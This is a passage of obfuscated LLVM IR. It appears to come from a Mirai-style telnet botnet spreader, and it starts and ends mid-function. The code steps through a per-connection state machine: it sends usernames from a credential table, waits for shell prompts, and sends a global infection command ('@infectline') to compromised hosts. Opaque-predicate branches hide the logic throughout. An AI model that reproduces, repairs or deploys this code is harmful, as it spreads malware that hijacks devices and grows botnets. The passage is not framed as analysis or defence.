  %1324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1323, i32 0, i32 8
  %1325 = load i8*, i8** %1324, align 8
  %1326 = call i64 @strlen(i8* %1325) #10
  %1327 = trunc i64 %1326 to i16
  %1328 = load i32, i32* %10, align 4
  %1329 = sext i32 %1328 to i64
  %1330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1329
  %1331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1330, i32 0, i32 7
  store i16 %1327, i16* %1331, align 16
  %1332 = load i32, i32* @x.63
  %1333 = load i32, i32* @y.64
  %1334 = sub i32 %1332, 1
  %1335 = mul i32 %1332, %1334
  %1336 = urem i32 %1335, 2
  %1337 = icmp eq i32 %1336, 0
  %1338 = icmp slt i32 %1333, 10
  %1339 = or i1 %1337, %1338
  br i1 %1339, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br label %1340

; <label>:1340:                                   ; preds = %originalBBpart2114
  %1341 = load i32, i32* @x.63
  %1342 = load i32, i32* @y.64
  %1343 = sub i32 %1341, 1
  %1344 = mul i32 %1341, %1343
  %1345 = urem i32 %1344, 2
  %1346 = icmp eq i32 %1345, 0
  %1347 = icmp slt i32 %1342, 10
  %1348 = or i1 %1346, %1347
  br i1 %1348, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %1340
  %1349 = load i32, i32* %10, align 4
  %1350 = sext i32 %1349 to i64
  %1351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1350
  %1352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1351, i32 0, i32 6
  %1353 = load i32, i32* %1352, align 4
  %1354 = add i32 %1353, 20
  %1355 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1356 = icmp ult i32 %1354, %1355
  %1357 = load i32, i32* @x.63
  %1358 = load i32, i32* @y.64
  %1359 = sub i32 %1357, 1
  %1360 = mul i32 %1357, %1359
  %1361 = urem i32 %1360, 2
  %1362 = icmp eq i32 %1361, 0
  %1363 = icmp slt i32 %1358, 10
  %1364 = or i1 %1362, %1363
  br i1 %1364, label %originalBBpart2123, label %originalBB116alteredBB

originalBBpart2123:                               ; preds = %originalBB116
  br i1 %1356, label %1365, label %1396

; <label>:1365:                                   ; preds = %originalBBpart2123
  %1366 = load i32, i32* @x.63
  %1367 = load i32, i32* @y.64
  %1368 = sub i32 %1366, 1
  %1369 = mul i32 %1366, %1368
  %1370 = urem i32 %1369, 2
  %1371 = icmp eq i32 %1370, 0
  %1372 = icmp slt i32 %1367, 10
  %1373 = or i1 %1371, %1372
  br i1 %1373, label %originalBB125, label %originalBB125alteredBB

originalBB125:                                    ; preds = %originalBB125alteredBB, %1365
  %1374 = load i32, i32* %10, align 4
  %1375 = sext i32 %1374 to i64
  %1376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1375
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1376, i32 0, i32 0
  %1378 = load i32, i32* %1377, align 16
  %1379 = call i32 @sclose(i32 %1378)
  %1380 = load i32, i32* %10, align 4
  %1381 = sext i32 %1380 to i64
  %1382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1381
  %1383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1382, i32 0, i32 2
  store i8 0, i8* %1383, align 8
  %1384 = load i32, i32* %10, align 4
  %1385 = sext i32 %1384 to i64
  %1386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1385
  %1387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1386, i32 0, i32 3
  store i8 1, i8* %1387, align 1
  %1388 = load i32, i32* @x.63
  %1389 = load i32, i32* @y.64
  %1390 = sub i32 %1388, 1
  %1391 = mul i32 %1388, %1390
  %1392 = urem i32 %1391, 2
  %1393 = icmp eq i32 %1392, 0
  %1394 = icmp slt i32 %1389, 10
  %1395 = or i1 %1393, %1394
  br i1 %1395, label %originalBBpart2127, label %originalBB125alteredBB

originalBBpart2127:                               ; preds = %originalBB125
  br label %1396

; <label>:1396:                                   ; preds = %originalBBpart2127, %originalBBpart2123
  br label %1526

; <label>:1397:                                   ; preds = %originalBBpart222
  %1398 = load i32, i32* %10, align 4
  %1399 = sext i32 %1398 to i64
  %1400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1399
  %1401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1400, i32 0, i32 0
  %1402 = load i32, i32* %1401, align 16
  %1403 = call i64 @send(i32 %1402, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i32 0, i32 0), i64 4, i32 16384)
  %1404 = icmp slt i64 %1403, 0
  br i1 %1404, label %1405, label %1420

; <label>:1405:                                   ; preds = %1397
  %1406 = load i32, i32* %10, align 4
  %1407 = sext i32 %1406 to i64
  %1408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1407
  %1409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1408, i32 0, i32 0
  %1410 = load i32, i32* %1409, align 16
  %1411 = call i32 @sclose(i32 %1410)
  %1412 = load i32, i32* %10, align 4
  %1413 = sext i32 %1412 to i64
  %1414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1413
  %1415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1414, i32 0, i32 2
  store i8 0, i8* %1415, align 8
  %1416 = load i32, i32* %10, align 4
  %1417 = sext i32 %1416 to i64
  %1418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1417
  %1419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1418, i32 0, i32 3
  store i8 1, i8* %1419, align 1
  br label %1527

; <label>:1420:                                   ; preds = %1397
  %1421 = load i32, i32* %10, align 4
  %1422 = sext i32 %1421 to i64
  %1423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1422
  %1424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1423, i32 0, i32 2
  store i8 8, i8* %1424, align 8
  br label %1526

; <label>:1425:                                   ; preds = %originalBBpart222
  %1426 = load i32, i32* %10, align 4
  %1427 = sext i32 %1426 to i64
  %1428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1427
  %1429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1428, i32 0, i32 6
  %1430 = load i32, i32* %1429, align 4
  %1431 = icmp eq i32 %1430, 0
  br i1 %1431, label %1432, label %1454

; <label>:1432:                                   ; preds = %1425
  %1433 = load i32, i32* @x.63
  %1434 = load i32, i32* @y.64
  %1435 = sub i32 %1433, 1
  %1436 = mul i32 %1433, %1435
  %1437 = urem i32 %1436, 2
  %1438 = icmp eq i32 %1437, 0
  %1439 = icmp slt i32 %1434, 10
  %1440 = or i1 %1438, %1439
  br i1 %1440, label %originalBB129, label %originalBB129alteredBB

originalBB129:                                    ; preds = %originalBB129alteredBB, %1432
  %1441 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1442 = load i32, i32* %10, align 4
  %1443 = sext i32 %1442 to i64
  %1444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1443
  %1445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1444, i32 0, i32 6
  store i32 %1441, i32* %1445, align 4
  %1446 = load i32, i32* @x.63
  %1447 = load i32, i32* @y.64
  %1448 = sub i32 %1446, 1
  %1449 = mul i32 %1446, %1448
  %1450 = urem i32 %1449, 2
  %1451 = icmp eq i32 %1450, 0
  %1452 = icmp slt i32 %1447, 10
  %1453 = or i1 %1451, %1452
  br i1 %1453, label %originalBBpart2131, label %originalBB129alteredBB

originalBBpart2131:                               ; preds = %originalBB129
  br label %1454

; <label>:1454:                                   ; preds = %originalBBpart2131, %1425
  %1455 = load i32, i32* %10, align 4
  %1456 = sext i32 %1455 to i64
  %1457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1456
  %1458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1457, i32 0, i32 0
  %1459 = load i32, i32* %1458, align 16
  %1460 = load i8*, i8** @infectline, align 8
  %1461 = load i8*, i8** @infectline, align 8
  %1462 = call i64 @strlen(i8* %1461) #10
  %1463 = call i64 @send(i32 %1459, i8* %1460, i64 %1462, i32 16384)
  %1464 = icmp slt i64 %1463, 0
  br i1 %1464, label %1465, label %1485

; <label>:1465:                                   ; preds = %1454
  %1466 = load i32, i32* %10, align 4
  %1467 = sext i32 %1466 to i64
  %1468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1467
  %1469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1468, i32 0, i32 0
  %1470 = load i32, i32* %1469, align 16
  %1471 = call i32 @sclose(i32 %1470)
  %1472 = load i32, i32* %10, align 4
  %1473 = sext i32 %1472 to i64
  %1474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1473
  %1475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1474, i32 0, i32 2
  store i8 0, i8* %1475, align 8
  %1476 = load i32, i32* %10, align 4
  %1477 = sext i32 %1476 to i64
  %1478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1477
  %1479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1478, i32 0, i32 3
  store i8 1, i8* %1479, align 1
  %1480 = load i32, i32* %10, align 4
  %1481 = sext i32 %1480 to i64
  %1482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1481
  %1483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1482, i32 0, i32 8
  %1484 = load i8*, i8** %1483, align 8
  call void @llvm.memset.p0i8.i64(i8* %1484, i8 0, i64 1024, i32 1, i1 false)
  br label %1527

; <label>:1485:                                   ; preds = %1454
  %1486 = load i32, i32* %10, align 4
  %1487 = sext i32 %1486 to i64
  %1488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1487
  %1489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1488, i32 0, i32 6
  %1490 = load i32, i32* %1489, align 4
  %1491 = add i32 %1490, 15
  %1492 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1493 = icmp ult i32 %1491, %1492
  br i1 %1493, label %1494, label %1509

; <label>:1494:                                   ; preds = %1485
  %1495 = load i32, i32* %10, align 4
  %1496 = sext i32 %1495 to i64
  %1497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1496
  %1498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1497, i32 0, i32 0
  %1499 = load i32, i32* %1498, align 16
  %1500 = call i32 @sclose(i32 %1499)
  %1501 = load i32, i32* %10, align 4
  %1502 = sext i32 %1501 to i64
  %1503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1502
  %1504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1503, i32 0, i32 2
  store i8 0, i8* %1504, align 8
  %1505 = load i32, i32* %10, align 4
  %1506 = sext i32 %1505 to i64
  %1507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1506
  %1508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1507, i32 0, i32 3
  store i8 1, i8* %1508, align 1
  br label %1509

; <label>:1509:                                   ; preds = %1494, %1485
  %1510 = load i32, i32* @x.63
  %1511 = load i32, i32* @y.64
  %1512 = sub i32 %1510, 1
  %1513 = mul i32 %1510, %1512
  %1514 = urem i32 %1513, 2
  %1515 = icmp eq i32 %1514, 0
  %1516 = icmp slt i32 %1511, 10
  %1517 = or i1 %1515, %1516
  br i1 %1517, label %originalBB133, label %originalBB133alteredBB

originalBB133:                                    ; preds = %originalBB133alteredBB, %1509
  %1518 = load i32, i32* @x.63
  %1519 = load i32, i32* @y.64
  %1520 = sub i32 %1518, 1
  %1521 = mul i32 %1518, %1520
  %1522 = urem i32 %1521, 2
  %1523 = icmp eq i32 %1522, 0
  %1524 = icmp slt i32 %1519, 10
  %1525 = or i1 %1523, %1524
  br i1 %1525, label %originalBBpart2135, label %originalBB133alteredBB

originalBBpart2135:                               ; preds = %originalBB133
  br label %1526

; <label>:1526:                                   ; preds = %originalBBpart2135, %1420, %1396, %1168, %originalBBpart298, %originalBBpart282, %originalBBpart274, %547, %311, %originalBBpart222
  br label %1527

; <label>:1527:                                   ; preds = %1526, %1465, %1405, %1306, %1265, %1237, %1153, %originalBBpart2102, %1021, %originalBBpart294, %852, %829, %715, %678, %originalBBpart270, %originalBBpart238, %264, %204
  %1528 = load i32, i32* %10, align 4
  %1529 = add nsw i32 %1528, 1
  store i32 %1529, i32* %10, align 4
  br label %96

; <label>:1530:                                   ; preds = %originalBBpart218
  br label %94
                                                  ; No predecessors!
  %1532 = load i32, i32* @x.63
  %1533 = load i32, i32* @y.64
  %1534 = sub i32 %1532, 1
  %1535 = mul i32 %1532, %1534
  %1536 = urem i32 %1535, 2
  %1537 = icmp eq i32 %1536, 0
  %1538 = icmp slt i32 %1533, 10
  %1539 = or i1 %1537, %1538
  br i1 %1539, label %originalBB137, label %originalBB137alteredBB

originalBB137:                                    ; preds = %originalBB137alteredBB, %1531
  %1540 = load i32, i32* @x.63
  %1541 = load i32, i32* @y.64
  %1542 = sub i32 %1540, 1
  %1543 = mul i32 %1540, %1542
  %1544 = urem i32 %1543, 2
  %1545 = icmp eq i32 %1544, 0
  %1546 = icmp slt i32 %1541, 10
  %1547 = or i1 %1545, %1546
  br i1 %1547, label %originalBBpart2139, label %originalBB137alteredBB

originalBBpart2139:                               ; preds = %originalBB137
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %1548 = alloca i32, align 4
  %1549 = alloca i32, align 4
  %1550 = alloca i32, align 4
  %1551 = alloca %struct.__sigset_t, align 8
  %1552 = alloca %struct.timeval, align 8
  %1553 = alloca i32, align 4
  %1554 = alloca i32, align 4
  %1555 = alloca %struct.sockaddr_in, align 4
  %1556 = alloca i8*, align 8
  %1557 = alloca %struct.timeval, align 8
  %1558 = alloca i8*, align 8
  %1559 = alloca i32, align 4
  %1560 = alloca i32, align 4
  %1561 = call i32 @getdtablesize() #2
  %_ = shl i32 %1561, 4
  %_1 = sub i32 %1561, 4
  %gen = mul i32 %_1, 4
  %_2 = sub i32 0, %1561
  %gen3 = add i32 %_2, 4
  %_4 = sub i32 %1561, 4
  %gen5 = mul i32 %_4, 4
  %_6 = shl i32 %1561, 4
  %_7 = shl i32 %1561, 4
  %1562 = sdiv i32 %1561, 4
  %_8 = sub i32 %1562, 3
  %gen9 = mul i32 %_8, 3
  %_10 = sub i32 %1562, 3
  %gen11 = mul i32 %_10, 3
  %1563 = mul nsw i32 %1562, 3
  store i32 %1563, i32* %1548, align 4
  %1564 = load i32, i32* %1548, align 4
  %1565 = icmp sgt i32 %1564, 512
  br label %originalBB

originalBB12alteredBB:                            ; preds = %originalBB12, %36
  %1566 = load i32, i32* %9, align 4
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %96
  %1567 = load i32, i32* %10, align 4
  %1568 = load i32, i32* %9, align 4
  %1569 = icmp slt i32 %1567, %1568
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %116
  %1570 = load i32, i32* %10, align 4
  %1571 = sext i32 %1570 to i64
  %1572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1571
  %1573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1572, i32 0, i32 2
  %1574 = load i8, i8* %1573, align 8
  %1575 = zext i8 %1574 to i32
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %209
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %325
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %408
  %1576 = load i32, i32* %10, align 4
  %1577 = sext i32 %1576 to i64
  %1578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1577
  %1579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1578, i32 0, i32 0
  %1580 = load i32, i32* %1579, align 16
  %1581 = load i32, i32* %10, align 4
  %1582 = sext i32 %1581 to i64
  %1583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1582
  %1584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1583, i32 0, i32 0
  %1585 = load i32, i32* %1584, align 16
  %1586 = call i32 (i32, i32, ...) @fcntl(i32 %1585, i32 3, i8* null)
  %_33 = sub i32 %1586, -2049
  %gen34 = mul i32 %_33, -2049
  %_35 = sub i32 0, %1586
  %gen36 = add i32 %_35, -2049
  %1587 = and i32 %1586, -2049
  %1588 = call i32 (i32, i32, ...) @fcntl(i32 %1580, i32 4, i32 %1587)
  %1589 = load i32, i32* %10, align 4
  %1590 = sext i32 %1589 to i64
  %1591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1590
  %1592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1591, i32 0, i32 6
  store i32 0, i32* %1592, align 4
  %1593 = load i32, i32* %10, align 4
  %1594 = sext i32 %1593 to i64
  %1595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1594
  %1596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1595, i32 0, i32 7
  store i16 0, i16* %1596, align 16
  %1597 = load i32, i32* %10, align 4
  %1598 = sext i32 %1597 to i64
  %1599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1598
  %1600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1599, i32 0, i32 8
  %1601 = load i8*, i8** %1600, align 8
  call void @llvm.memset.p0i8.i64(i8* %1601, i8 0, i64 1024, i32 1, i1 false)
  %1602 = load i32, i32* %10, align 4
  %1603 = sext i32 %1602 to i64
  %1604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1603
  %1605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1604, i32 0, i32 2
  store i8 2, i8* %1605, align 8
  br label %originalBB32

originalBB40alteredBB:                            ; preds = %originalBB40, %456
  %1606 = load i32, i32* %11, align 4
  %1607 = icmp eq i32 %1606, -1
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %475
  %1608 = load i32, i32* %10, align 4
  %1609 = sext i32 %1608 to i64
  %1610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1609
  %1611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1610, i32 0, i32 0
  %1612 = load i32, i32* %1611, align 16
  %1613 = call i32 @sclose(i32 %1612)
  %1614 = load i32, i32* %10, align 4
  %1615 = sext i32 %1614 to i64
  %1616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1615
  %1617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1616, i32 0, i32 2
  store i8 0, i8* %1617, align 8
  %1618 = load i32, i32* %10, align 4
  %1619 = sext i32 %1618 to i64
  %1620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1619
  %1621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1620, i32 0, i32 3
  store i8 1, i8* %1621, align 1
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %507
  %1622 = load i32, i32* %10, align 4
  %1623 = sext i32 %1622 to i64
  %1624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1623
  %1625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1624, i32 0, i32 6
  %1626 = load i32, i32* %1625, align 4
  %_49 = sub i32 0, %1626
  %gen50 = add i32 %_49, 5
  %_51 = shl i32 %1626, 5
  %_52 = sub i32 0, %1626
  %gen53 = add i32 %_52, 5
  %_54 = sub i32 0, %1626
  %gen55 = add i32 %_54, 5
  %_56 = shl i32 %1626, 5
  %1627 = add i32 %1626, 5
  %1628 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1629 = icmp ult i32 %1627, %1628
  br label %originalBB48

originalBB60alteredBB:                            ; preds = %originalBB60, %561
  %1630 = load i32, i32* %10, align 4
  %1631 = sext i32 %1630 to i64
  %1632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1631
  %1633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1632, i32 0, i32 8
  %1634 = load i8*, i8** %1633, align 8
  %1635 = call i32 @matchPrompt(i8* %1634)
  %1636 = icmp ne i32 %1635, 0
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %590
  %1637 = load i32, i32* %10, align 4
  %1638 = sext i32 %1637 to i64
  %1639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1638
  %1640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1639, i32 0, i32 0
  %1641 = load i32, i32* %1640, align 16
  %1642 = load i32, i32* %10, align 4
  %1643 = sext i32 %1642 to i64
  %1644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1643
  %1645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1644, i32 0, i32 8
  %1646 = load i8*, i8** %1645, align 8
  %1647 = load i32, i32* %10, align 4
  %1648 = sext i32 %1647 to i64
  %1649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1648
  %1650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1649, i32 0, i32 7
  %1651 = load i16, i16* %1650, align 16
  %1652 = zext i16 %1651 to i32
  %1653 = call i32 @readUntil(i32 %1641, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.48, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %1646, i32 1024, i32 %1652)
  %1654 = icmp ne i32 %1653, 0
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %625
  %1655 = load i32, i32* %10, align 4
  %1656 = sext i32 %1655 to i64
  %1657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1656
  %1658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1657, i32 0, i32 6
  store i32 0, i32* %1658, align 4
  %1659 = load i32, i32* %10, align 4
  %1660 = sext i32 %1659 to i64
  %1661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1660
  %1662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1661, i32 0, i32 7
  store i16 0, i16* %1662, align 16
  %1663 = load i32, i32* %10, align 4
  %1664 = sext i32 %1663 to i64
  %1665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1664
  %1666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1665, i32 0, i32 8
  %1667 = load i8*, i8** %1666, align 8
  call void @llvm.memset.p0i8.i64(i8* %1667, i8 0, i64 1024, i32 1, i1 false)
  %1668 = load i32, i32* %10, align 4
  %1669 = sext i32 %1668 to i64
  %1670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1669
  %1671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1670, i32 0, i32 2
  store i8 3, i8* %1671, align 8
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %771
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %788
  %1672 = load i32, i32* %10, align 4
  %1673 = sext i32 %1672 to i64
  %1674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1673
  %1675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1674, i32 0, i32 0
  %1676 = load i32, i32* %1675, align 16
  %1677 = load i32, i32* %10, align 4
  %1678 = sext i32 %1677 to i64
  %1679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1678
  %1680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1679, i32 0, i32 4
  %1681 = load i8, i8* %1680, align 2
  %1682 = zext i8 %1681 to i64
  %1683 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %1682
  %1684 = load i8*, i8** %1683, align 8
  %1685 = load i32, i32* %10, align 4
  %1686 = sext i32 %1685 to i64
  %1687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1686
  %1688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1687, i32 0, i32 4
  %1689 = load i8, i8* %1688, align 2
  %1690 = zext i8 %1689 to i64
  %1691 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %1690
  %1692 = load i8*, i8** %1691, align 8
  %1693 = call i64 @strlen(i8* %1692) #10
  %1694 = call i64 @send(i32 %1676, i8* %1684, i64 %1693, i32 16384)
  %1695 = icmp slt i64 %1694, 0
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %867
  %1696 = load i32, i32* %10, align 4
  %1697 = sext i32 %1696 to i64
  %1698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1697
  %1699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1698, i32 0, i32 2
  store i8 4, i8* %1699, align 8
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %949
  %1700 = load i32, i32* %10, align 4
  %1701 = sext i32 %1700 to i64
  %1702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1701
  %1703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1702, i32 0, i32 2
  store i8 5, i8* %1703, align 8
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %970
  %1704 = load i32, i32* %10, align 4
  %1705 = sext i32 %1704 to i64
  %1706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1705
  %1707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1706, i32 0, i32 2
  store i8 7, i8* %1707, align 8
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %991
  %1708 = load i32, i32* %10, align 4
  %1709 = sext i32 %1708 to i64
  %1710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1709
  %1711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1710, i32 0, i32 8
  %1712 = load i8*, i8** %1711, align 8
  call void @llvm.memset.p0i8.i64(i8* %1712, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %1072
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %1114
  %1713 = load i32, i32* %10, align 4
  %1714 = sext i32 %1713 to i64
  %1715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1714
  %1716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1715, i32 0, i32 0
  %1717 = load i32, i32* %1716, align 16
  %1718 = call i32 @sclose(i32 %1717)
  %1719 = load i32, i32* %10, align 4
  %1720 = sext i32 %1719 to i64
  %1721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1720
  %1722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1721, i32 0, i32 2
  store i8 0, i8* %1722, align 8
  %1723 = load i32, i32* %10, align 4
  %1724 = sext i32 %1723 to i64
  %1725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1724
  %1726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1725, i32 0, i32 3
  store i8 1, i8* %1726, align 1
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %1180
  %1727 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1728 = load i32, i32* %10, align 4
  %1729 = sext i32 %1728 to i64
  %1730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1729
  %1731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1730, i32 0, i32 6
  store i32 %1727, i32* %1731, align 4
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %1285
  %1732 = load i32, i32* %10, align 4
  %1733 = sext i32 %1732 to i64
  %1734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1733
  %1735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1734, i32 0, i32 2
  store i8 7, i8* %1735, align 8
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %1312
  %1736 = load i32, i32* %10, align 4
  %1737 = sext i32 %1736 to i64
  %1738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1737
  %1739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1738, i32 0, i32 8
  %1740 = load i8*, i8** %1739, align 8
  %1741 = call i64 @strlen(i8* %1740) #10
  %1742 = trunc i64 %1741 to i16
  %1743 = load i32, i32* %10, align 4
  %1744 = sext i32 %1743 to i64
  %1745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1744
  %1746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1745, i32 0, i32 7
  store i16 %1742, i16* %1746, align 16
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %1340
  %1747 = load i32, i32* %10, align 4
  %1748 = sext i32 %1747 to i64
  %1749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1748
